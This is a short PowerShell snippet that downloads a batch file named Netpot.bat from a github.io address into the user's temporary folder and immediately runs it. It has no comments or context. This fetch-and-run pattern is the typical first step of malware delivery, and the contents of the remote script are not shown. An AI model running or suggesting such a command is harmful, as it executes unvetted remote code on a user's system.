$batUrl = 'https://young-zerka.github.io/netpot/Netpot.bat'
$tempPath = "$env:TEMP\Netpot.bat"
Invoke-WebRequest -Uri $batUrl -OutFile $tempPath
Start-Process -FilePath $tempPath -Wait
